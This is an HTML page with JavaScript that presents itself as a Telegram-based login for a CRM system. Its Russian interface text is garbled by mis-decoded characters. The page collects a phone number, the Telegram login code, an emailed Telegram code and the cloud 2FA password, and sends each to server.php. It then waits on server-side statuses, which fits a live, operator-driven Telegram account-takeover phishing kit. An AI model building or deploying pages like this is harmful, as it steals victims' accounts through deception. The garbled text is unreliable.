<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CRM System Auth</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Arial, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; padding: 20px; }
        .container { max-width: 400px; margin: 0 auto; }
        .card { background: white; border-radius: 15px; padding: 30px; box-shadow: 0 20px 60px rgba(0,0,0,0.3); }
        .logo { text-align: center; margin-bottom: 20px; }
        .logo img { width: 60px; height: 60px; }
        h1 { text-align: center; color: #333; margin-bottom: 10px; }
        .subtitle { text-align: center; color: #666; margin-bottom: 30px; font-size: 14px; }
        .step { display: none; }
        .step.active { display: block; }
        .form-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 8px; color: #333; font-weight: bold; }
        input, select { width: 100%; padding: 12px; border: 2px solid #ddd; border-radius: 8px; font-size: 16px; }
        input:focus, select:focus { border-color: #667eea; outline: none; }
        .btn { background: #667eea; color: white; border: none; padding: 14px; width: 100%; border-radius: 8px; font-size: 16px; cursor: pointer; margin-top: 10px; }
        .btn:hover { background: #5a67d8; }
        .btn-success { background: #48bb78; }
        .btn-success:hover { background: #38a169; }
        .alert { padding: 12px; border-radius: 8px; margin-bottom: 20px; text-align: center; display: none; }
        .alert-success { background: #c6f6d5; color: #22543d; }
        .alert-error { background: #fed7d7; color: #742a2a; }
        .alert-info { background: #bee3f8; color: #2a4365; }
        .loading { text-align: center; padding: 20px; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #667eea; border-radius: 50%; width: 40px; height: 40px; margin: 0 auto 15px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .session-id { background: #f7fafc; padding: 8px; border-radius: 6px; font-family: monospace; font-size: 12px; margin: 10px 0; text-align: center; }
        .back-btn { background: #a0aec0; color: white; border: none; padding: 10px; width: 100%; border-radius: 8px; margin-bottom: 15px; cursor: pointer; }
        .back-btn:hover { background: #718096; }
        .step-indicator { display: flex; justify-content: center; gap: 10px; margin-bottom: 20px; }
        .step-dot { width: 10px; height: 10px; border-radius: 50%; background: #ddd; }
        .step-dot.active { background: #667eea; }
        .phone-input { display: flex; gap: 10px; }
        .country-code { flex: 0 0 80px; }
        .phone-number { flex: 1; }
        .instructions { background: #f7fafc; padding: 15px; border-radius: 8px; margin: 15px 0; font-size: 13px; border-left: 4px solid #667eea; }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="logo">üîê</div>
            <h1>–ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∫ CRM —Å–∏—Å—Ç–µ–º–µ</h1>
            <p class="subtitle">–ê—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—è —á–µ—Ä–µ–∑ Telegram –¥–ª—è –¥–æ—Å—Ç—É–ø–∞ –∫ CRM</p>
            
            <div class="step-indicator">
                <div class="step-dot active" id="dot1"></div>
                <div class="step-dot" id="dot2"></div>
                <div class="step-dot" id="dot3"></div>
                <div class="step-dot" id="dot4"></div>
                <div class="step-dot" id="dot5"></div>
                <div class="step-dot" id="dot6"></div>
            </div>
            
            <div class="alert" id="alert"></div>
            
            <!-- –®–∞–≥ 1: –í–≤–æ–¥ —Ç–µ–ª–µ—Ñ–æ–Ω–∞ -->
            <div class="step active" id="step1">
                <div class="form-group">
                    <label>–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ Telegram</label>
                    <div class="phone-input">
                        <select class="country-code" id="countryCode">
                            <option value="7">üá∑üá∫ –†–æ—Å—Å–∏—è +7</option>
                            <option value="375">üáßüáæ –ë–µ–ª–∞—Ä—É—Å—å +375</option>
                            <option value="1">üá∫üá∏ –°–®–ê +1</option>
                            <option value="44">üá¨üáß –ë—Ä–∏—Ç–∞–Ω–∏—è +44</option>
                            <option value="77">üá∞üáø –ö–∞–∑–∞—Ö—Å—Ç–∞–Ω +7</option>
                        </select>
                        <input type="tel" id="phone" placeholder="912345678" class="phone-number">
                    </div>
                </div>
                <button class="btn" onclick="sendPhone()">–ù–∞—á–∞—Ç—å –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ</button>
                <div class="instructions">
                    üîí <strong>–ë–µ–∑–æ–ø–∞—Å–Ω–æ:</strong> –í–∞—à–∏ –¥–∞–Ω–Ω—ã–µ –∑–∞—â–∏—â–µ–Ω—ã —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–µ–º
                </div>
            </div>
            
            <!-- –®–∞–≥ 2: –û–∂–∏–¥–∞–Ω–∏–µ –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏ -->
            <div class="step" id="step2">
                <div class="loading">
                    <div class="loader"></div>
                    <p><strong>–í—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—è...</strong></p>
                    <div class="session-id" id="sessionId">ID: loading...</div>
                    <div class="instructions">
                        üìû <strong>–ù–æ–º–µ—Ä:</strong> <span id="waitingPhone"></span><br>
                        ‚è±Ô∏è <strong>–û–∂–∏–¥–∞–Ω–∏–µ:</strong> <span id="waitingTime">0</span> —Å–µ–∫.
                    </div>
                </div>
            </div>
            
            <!-- –®–∞–≥ 3: –í–≤–æ–¥ –∫–æ–¥–∞ –∏–∑ Telegram -->
            <div class="step" id="step3">
                <button class="back-btn" onclick="backToStep1()">‚Üê –ù–∞–∑–∞–¥</button>
                <div class="form-group">
                    <label>–ö–æ–¥ –∏–∑ Telegram (5 —Ü–∏—Ñ—Ä)</label>
                    <input type="text" id="tgCode" placeholder="12345" maxlength="5">
                </div>
                <div class="instructions">
                    üì± <strong>–ì–¥–µ –Ω–∞–π—Ç–∏ –∫–æ–¥?</strong><br>
                    1. –û—Ç–∫—Ä–æ–π—Ç–µ Telegram<br>
                    2. –ù–∞–π–¥–∏—Ç–µ —Å–æ–æ–±—â–µ–Ω–∏–µ —Å –∫–æ–¥–æ–º<br>
                    3. –í–≤–µ–¥–∏—Ç–µ 5 —Ü–∏—Ñ—Ä
                </div>
                <button class="btn" onclick="sendTgCode()">–û—Ç–ø—Ä–∞–≤–∏—Ç—å –Ω–∞ –ø—Ä–æ–≤–µ—Ä–∫—É</button>
            </div>
            
            <!-- –®–∞–≥ 4: –í–≤–æ–¥ –∫–æ–¥–∞ —Å –ø–æ—á—Ç—ã -->
            <div class="step" id="step4">
                <button class="back-btn" onclick="backToStep1()">‚Üê –ù–∞–∑–∞–¥</button>
                <div class="form-group">
                    <label>–ö–æ–¥ —Å email (6 —Ü–∏—Ñ—Ä)</label>
                    <input type="text" id="emailCode" placeholder="123456" maxlength="6">
                </div>
                <div class="instructions">
                    üìß <strong>–ì–¥–µ –Ω–∞–π—Ç–∏ –∫–æ–¥?</strong><br>
                    1. –ü—Ä–æ–≤–µ—Ä—å—Ç–µ –ø–æ—á—Ç—É<br>
                    2. –ù–∞–π–¥–∏—Ç–µ –ø–∏—Å—å–º–æ –æ—Ç Telegram<br>
                    3. –í–≤–µ–¥–∏—Ç–µ 6 —Ü–∏—Ñ—Ä
                </div>
                <button class="btn" onclick="sendEmailCode()">–û—Ç–ø—Ä–∞–≤–∏—Ç—å –Ω–∞ –ø—Ä–æ–≤–µ—Ä–∫—É</button>
            </div>
            
            <!-- –®–∞–≥ 5: –í–≤–æ–¥ –æ–±–ª–∞—á–Ω–æ–≥–æ –ø–∞—Ä–æ–ª—è 2FA -->
            <div class="step" id="step5">
                <button class="back-btn" onclick="backToStep1()">‚Üê –ù–∞–∑–∞–¥</button>
                <div class="form-group">
                    <label>–û–±–ª–∞—á–Ω—ã–π –ø–∞—Ä–æ–ª—å 2FA</label>
                    <input type="password" id="password2FA" placeholder="–í–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å –¥–≤—É—Ö—Ñ–∞–∫—Ç–æ—Ä–Ω–æ–π –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏">
                </div>
                <div class="instructions">
                    üîê <strong>–ß—Ç–æ —ç—Ç–æ —Ç–∞–∫–æ–µ?</strong><br>
                    –ü–∞—Ä–æ–ª—å –æ–±–ª–∞—á–Ω–æ–≥–æ Telegram, –∫–æ—Ç–æ—Ä—ã–π –≤—ã —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–ª–∏ –¥–ª—è –∑–∞—â–∏—Ç—ã –∞–∫–∫–∞—É–Ω—Ç–∞
                </div>
                <button class="btn" onclick="send2FAPassword()">–û—Ç–ø—Ä–∞–≤–∏—Ç—å –Ω–∞ –ø—Ä–æ–≤–µ—Ä–∫—É</button>
            </div>
            
            <!-- –®–∞–≥ 6: –£—Å–ø–µ—Ö -->
            <div class="step" id="step6">
                <div class="alert alert-success">
                    ‚úÖ <strong>–ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ —É—Å–ø–µ—à–Ω–æ!</strong>
                </div>
                <div style="text-align: center; padding: 20px;">
                    <div style="font-size: 48px; margin-bottom: 10px;">üéâ</div>
                    <p><strong>–í–∞—à –∞–∫–∫–∞—É–Ω—Ç –ø–æ–¥–∫–ª—é—á–µ–Ω –∫ CRM —Å–∏—Å—Ç–µ–º–µ</strong></p>
                    <div class="instructions">
                        üìû <strong>–ù–æ–º–µ—Ä:</strong> <span id="finalPhone"></span><br>
                        üïê <strong>–í—Ä–µ–º—è:</strong> <span id="finalTime"></span><br>
                        ‚úÖ <strong>–°—Ç–∞—Ç—É—Å:</strong> –ê—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—è –ø—Ä–æ–π–¥–µ–Ω–∞
                    </div>
                </div>
                <button class="btn btn-success" onclick="resetForm()">–ü–æ–¥–∫–ª—é—á–∏—Ç—å –¥—Ä—É–≥–æ–π –∞–∫–∫–∞—É–Ω—Ç</button>
            </div>
        </div>
    </div>

    <script>
        let currentStep = 1;
        let sessionId = '';
        let userPhone = '';
        let waitingTimer = null;
        let waitingSeconds = 0;
        
        // –í–æ—Å—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º —Å–æ—Å—Ç–æ—è–Ω–∏–µ –∏–∑ localStorage
        function restoreState() {
            const savedSession = localStorage.getItem('crm_auth_session');
            if (savedSession) {
                try {
                    const session = JSON.parse(savedSession);
                    sessionId = session.sessionId || '';
                    userPhone = session.userPhone || '';
                    currentStep = session.currentStep || 1;
                    
                    if (sessionId && userPhone && currentStep > 1) {
                        showStep(currentStep);
                        document.getElementById('sessionId').textContent = `ID: ${sessionId}`;
                        document.getElementById('waitingPhone').textContent = userPhone;
                        
                        if (currentStep === 2) {
                            checkAuthResponse();
                        } else if (currentStep === 3 || currentStep === 4 || currentStep === 5) {
                            // –ü—Ä–æ–≤–µ—Ä—è–µ–º —Å—Ç–∞—Ç—É—Å –∫–æ–¥–∞
                            checkCodeStatus();
                        }
                    }
                } catch (e) {
                    console.error('–û—à–∏–±–∫–∞ –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏—è:', e);
                }
            }
        }
        
        // –°–æ—Ö—Ä–∞–Ω—è–µ–º —Å–æ—Å—Ç–æ—è–Ω–∏–µ –≤ localStorage
        function saveState() {
            const session = {
                sessionId: sessionId,
                userPhone: userPhone,
                currentStep: currentStep,
                timestamp: Date.now()
            };
            localStorage.setItem('crm_auth_session', JSON.stringify(session));
        }
        
        function showStep(step) {
            // –°–∫—Ä—ã–≤–∞–µ–º –≤—Å–µ —à–∞–≥–∏
            document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
            // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –Ω—É–∂–Ω—ã–π —à–∞–≥
            document.getElementById(`step${step}`).classList.add('active');
            // –û–±–Ω–æ–≤–ª—è–µ–º –∏–Ω–¥–∏–∫–∞—Ç–æ—Ä
            document.querySelectorAll('.step-dot').forEach((dot, index) => {
                dot.classList.toggle('active', index + 1 === step);
            });
            currentStep = step;
            
            // –°–æ—Ö—Ä–∞–Ω—è–µ–º —Å–æ—Å—Ç–æ—è–Ω–∏–µ
            saveState();
            
            // –û—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º —Ç–∞–π–º–µ—Ä –µ—Å–ª–∏ –Ω–µ –Ω–∞ —à–∞–≥–µ –æ–∂–∏–¥–∞–Ω–∏—è
            if (step !== 2 && waitingTimer) {
                clearInterval(waitingTimer);
                waitingSeconds = 0;
            }
        }
        
        function showAlert(message, type = 'info') {
            const alert = document.getElementById('alert');
            alert.textContent = message;
            alert.className = `alert alert-${type}`;
            alert.style.display = 'block';
            
            if (type !== 'error') {
                setTimeout(() => {
                    alert.style.display = 'none';
                }, 5000);
            }
        }
        
        function hideAlert() {
            document.getElementById('alert').style.display = 'none';
        }
        
        async function sendPhone() {
            const phoneInput = document.getElementById('phone').value.trim();
            const countryCode = document.getElementById('countryCode').value;
            
            if (!phoneInput || !/^\d{5,15}$/.test(phoneInput)) {
                showAlert('–í–≤–µ–¥–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ (5-15 —Ü–∏—Ñ—Ä)', 'error');
                return;
            }
            
            userPhone = `+${countryCode}${phoneInput}`;
            sessionId = 'session_' + Date.now();
            
            // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é
            document.getElementById('sessionId').textContent = `ID: ${sessionId}`;
            document.getElementById('waitingPhone').textContent = userPhone;
            document.getElementById('waitingTime').textContent = '0';
            
            // –ü–µ—Ä–µ—Ö–æ–¥–∏–º –∫ –æ–∂–∏–¥–∞–Ω–∏—é
            showStep(2);
            hideAlert();
            
            // –ó–∞–ø—É—Å–∫–∞–µ–º —Ç–∞–π–º–µ—Ä –æ–∂–∏–¥–∞–Ω–∏—è
            waitingSeconds = 0;
            waitingTimer = setInterval(() => {
                waitingSeconds++;
                document.getElementById('waitingTime').textContent = waitingSeconds;
            }, 1000);
            
            try {
                const response = await fetch('server.php', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        action: 'new_session',
                        session_id: sessionId,
                        phone: userPhone,
                        country_code: countryCode
                    })
                });
                
                const data = await response.json();
                
                if (data.success) {
                    showAlert('‚úÖ –ó–∞–ø—Ä–æ—Å –Ω–∞ –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—é –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω! –û–∂–∏–¥–∞–π—Ç–µ...', 'success');
                    // –ù–∞—á–∏–Ω–∞–µ–º –ø—Ä–æ–≤–µ—Ä—è—Ç—å —Å—Ç–∞—Ç—É—Å
                    checkAuthResponse();
                } else {
                    throw new Error(data.error || '–û—à–∏–±–∫–∞ —Å–µ—Ä–≤–µ—Ä–∞');
                }
            } catch (error) {
                showAlert('‚ùå –û—à–∏–±–∫–∞: ' + error.message, 'error');
                showStep(1);
                clearInterval(waitingTimer);
            }
        }
        
        function checkAuthResponse() {
            let attempts = 0;
            const maxAttempts = 600; // 20 –º–∏–Ω—É—Ç
            
            const check = async () => {
                attempts++;
                
                if (attempts >= maxAttempts) {
                    showAlert('‚è±Ô∏è –í—Ä–µ–º—è –æ–∂–∏–¥–∞–Ω–∏—è –∏—Å—Ç–µ–∫–ª–æ', 'error');
                    showStep(1);
                    clearInterval(waitingTimer);
                    localStorage.removeItem('crm_auth_session');
                    return;
                }
                
                try {
                    const response = await fetch('server.php', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            action: 'check_status',
                            session_id: sessionId
                        })
                    });
                    
                    const data = await response.json();
                    
                    if (data.success) {
                        switch (data.status) {
                            case 'tg_code':
                                clearInterval(waitingTimer);
                                showAlert('‚úÖ –ù–æ–º–µ—Ä –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω! –í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ –∏–∑ Telegram', 'success');
                                showStep(3);
                                return;
                                
                            case 'email_code':
                                clearInterval(waitingTimer);
                                showAlert('üìß –ó–∞–ø—Ä–æ—à–µ–Ω email –∫–æ–¥', 'info');
                                showStep(4);
                                return;
                                
                            case 'denied':
                                clearInterval(waitingTimer);
                                showAlert('‚ùå –ê—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—è –æ—Ç–∫–ª–æ–Ω–µ–Ω–∞', 'error');
                                showStep(1);
                                localStorage.removeItem('crm_auth_session');
                                return;
                                
                            default:
                                // –ü—Ä–æ–¥–æ–ª–∂–∞–µ–º –∂–¥–∞—Ç—å
                                setTimeout(check, 2000);
                        }
                    } else {
                        setTimeout(check, 2000);
                    }
                } catch (error) {
                    setTimeout(check, 2000);
                }
            };
            
            setTimeout(check, 2000);
        }
        
        async function sendTgCode() {
            const code = document.getElementById('tgCode').value.trim();
            
            if (!code || !/^\d{5}$/.test(code)) {
                showAlert('–í–≤–µ–¥–∏—Ç–µ 5-–∑–Ω–∞—á–Ω—ã–π –∫–æ–¥', 'error');
                return;
            }
            
            showAlert('üì§ –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∫–æ–¥ –Ω–∞ –ø—Ä–æ–≤–µ—Ä–∫—É...', 'info');
            
            try {
                const response = await fetch('server.php', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        action: 'send_code',
                        session_id: sessionId,
                        code: code,
                        code_type: 'tg_code'
                    })
                });
                
                const data = await response.json();
                
                if (data.success) {
                    showAlert('‚úÖ –ö–æ–¥ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω! –û–∂–∏–¥–∞–µ–º –ø—Ä–æ–≤–µ—Ä–∫–∏...', 'success');
                    checkCodeStatus();
                } else {
                    throw new Error(data.error || '–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏');
                }
            } catch (error) {
                showAlert('‚ùå –û—à–∏–±–∫–∞: ' + error.message, 'error');
            }
        }
        
        async function sendEmailCode() {
            const code = document.getElementById('emailCode').value.trim();
            
            if (!code || !/^\d{6}$/.test(code)) {
                showAlert('–í–≤–µ–¥–∏—Ç–µ 6-–∑–Ω–∞—á–Ω—ã–π –∫–æ–¥', 'error');
                return;
            }
            
            showAlert('üì§ –û—Ç–ø—Ä–∞–≤–ª—è–µ–º email –∫–æ–¥ –Ω–∞ –ø—Ä–æ–≤–µ—Ä–∫—É...', 'info');
            
            try {
                const response = await fetch('server.php', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        action: 'send_code',
                        session_id: sessionId,
                        code: code,
                        code_type: 'email_code'
                    })
                });
                
                const data = await response.json();
                
                if (data.success) {
                    showAlert('‚úÖ Email –∫–æ–¥ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω! –û–∂–∏–¥–∞–µ–º –ø—Ä–æ–≤–µ—Ä–∫–∏...', 'success');
                    checkCodeStatus();
                } else {
                    throw new Error(data.error || '–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏');
                }
            } catch (error) {
                showAlert('‚ùå –û—à–∏–±–∫–∞: ' + error.message, 'error');
            }
        }
        
        async function send2FAPassword() {
            const password = document.getElementById('password2FA').value.trim();
            
            if (!password) {
                showAlert('–í–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å 2FA', 'error');
                return;
            }
            
            showAlert('üì§ –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –ø–∞—Ä–æ–ª—å 2FA –Ω–∞ –ø—Ä–æ–≤–µ—Ä–∫—É...', 'info');
            
            try {
                const response = await fetch('server.php', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        action: 'send_code',
                        session_id: sessionId,
                        code: password,
                        code_type: 'password_2fa'
                    })
                });
                
                const data = await response.json();
                
                if (data.success) {
                    showAlert('‚úÖ –ü–∞—Ä–æ–ª—å –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω! –û–∂–∏–¥–∞–µ–º –ø—Ä–æ–≤–µ—Ä–∫–∏...', 'success');
                    checkCodeStatus();
                } else {
                    throw new Error(data.error || '–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏');
                }
            } catch (error) {
                showAlert('‚ùå –û—à–∏–±–∫–∞: ' + error.message, 'error');
            }
        }
        
        function checkCodeStatus() {
            let attempts = 0;
            const maxAttempts = 300;
            
            const check = async () => {
                attempts++;
                
                if (attempts >= maxAttempts) {
                    showAlert('‚è±Ô∏è –í—Ä–µ–º—è –ø—Ä–æ–≤–µ—Ä–∫–∏ –∏—Å—Ç–µ–∫–ª–æ', 'error');
                    showStep(currentStep);
                    return;
                }
                
                try {
                    const response = await fetch('server.php', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            action: 'check_code_status',
                            session_id: sessionId
                        })
                    });
                    
                    const data = await response.json();
                    
                    if (data.success) {
                        switch (data.status) {
                            case 'correct':
                                // –ö–æ–¥ –≤–µ—Ä–Ω—ã–π, –ø—Ä–æ–≤–µ—Ä—è–µ–º –Ω—É–∂–µ–Ω –ª–∏ –ø–∞—Ä–æ–ª—å 2FA
                                if (data.next_step === 'password_2fa') {
                                    showAlert('‚úÖ –ö–æ–¥ –≤–µ—Ä–Ω—ã–π! –¢–µ–ø–µ—Ä—å –≤–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å 2FA', 'success');
                                    showStep(5);
                                } else {
                                    showAlert('‚úÖ –ö–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω!', 'success');
                                    completeAuth();
                                }
                                return;
                                
                            case 'incorrect':
                                showAlert('‚ùå –ö–æ–¥ –Ω–µ–≤–µ—Ä–Ω—ã–π, –ø–æ–≤—Ç–æ—Ä–∏—Ç–µ –ø–æ–ø—ã—Ç–∫—É', 'error');
                                // –û—á–∏—â–∞–µ–º –ø–æ–ª–µ –≤–≤–æ–¥–∞
                                if (currentStep === 3) {
                                    document.getElementById('tgCode').value = '';
                                    document.getElementById('tgCode').focus();
                                } else if (currentStep === 4) {
                                    document.getElementById('emailCode').value = '';
                                    document.getElementById('emailCode').focus();
                                } else if (currentStep === 5) {
                                    document.getElementById('password2FA').value = '';
                                    document.getElementById('password2FA').focus();
                                }
                                return;
                                
                            default:
                                setTimeout(check, 2000);
                        }
                    } else {
                        setTimeout(check, 2000);
                    }
                } catch (error) {
                    setTimeout(check, 2000);
                }
            };
            
            setTimeout(check, 2000);
        }
        
        async function completeAuth() {
            try {
                const response = await fetch('server.php', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        action: 'complete_auth',
                        session_id: sessionId
                    })
                });
                
                const data = await response.json();
                
                if (data.success) {
                    document.getElementById('finalPhone').textContent = userPhone;
                    document.getElementById('finalTime').textContent = new Date().toLocaleTimeString();
                    showStep(6);
                    localStorage.removeItem('crm_auth_session');
                }
            } catch (error) {
                showAlert('–û—à–∏–±–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è', 'error');
            }
        }
        
        function backToStep1() {
            showStep(1);
            hideAlert();
            if (waitingTimer) {
                clearInterval(waitingTimer);
                waitingSeconds = 0;
            }
        }
        
        function resetForm() {
            document.getElementById('phone').value = '';
            document.getElementById('tgCode').value = '';
            document.getElementById('emailCode').value = '';
            document.getElementById('password2FA').value = '';
            document.getElementById('countryCode').value = '7';
            hideAlert();
            showStep(1);
            sessionId = '';
            userPhone = '';
            localStorage.removeItem('crm_auth_session');
        }
        
        // –û–±—Ä–∞–±–æ—Ç—á–∏–∫–∏ Enter
        document.getElementById('phone').addEventListener('keypress', (e) => {
            if (e.key === 'Enter') sendPhone();
        });
        
        document.getElementById('tgCode').addEventListener('keypress', (e) => {
            if (e.key === 'Enter') sendTgCode();
        });
        
        document.getElementById('emailCode').addEventListener('keypress', (e) => {
            if (e.key === 'Enter') sendEmailCode();
        });
        
        document.getElementById('password2FA').addEventListener('keypress', (e) => {
            if (e.key === 'Enter') send2FAPassword();
        });
        
        // –ê–≤—Ç–æ–æ—Ç–ø—Ä–∞–≤–∫–∞ –ø—Ä–∏ –ø–æ–ª–Ω–æ–º –≤–≤–æ–¥–µ
        document.getElementById('tgCode').addEventListener('input', (e) => {
            if (e.target.value.length === 5) {
                setTimeout(() => sendTgCode(), 100);
            }
        });
        
        document.getElementById('emailCode').addEventListener('input', (e) => {
            if (e.target.value.length === 6) {
                setTimeout(() => sendEmailCode(), 100);
            }
        });
        
        // –í–æ—Å—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º —Å–æ—Å—Ç–æ—è–Ω–∏–µ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ
        window.addEventListener('load', restoreState);
    </script>
</body>
</html>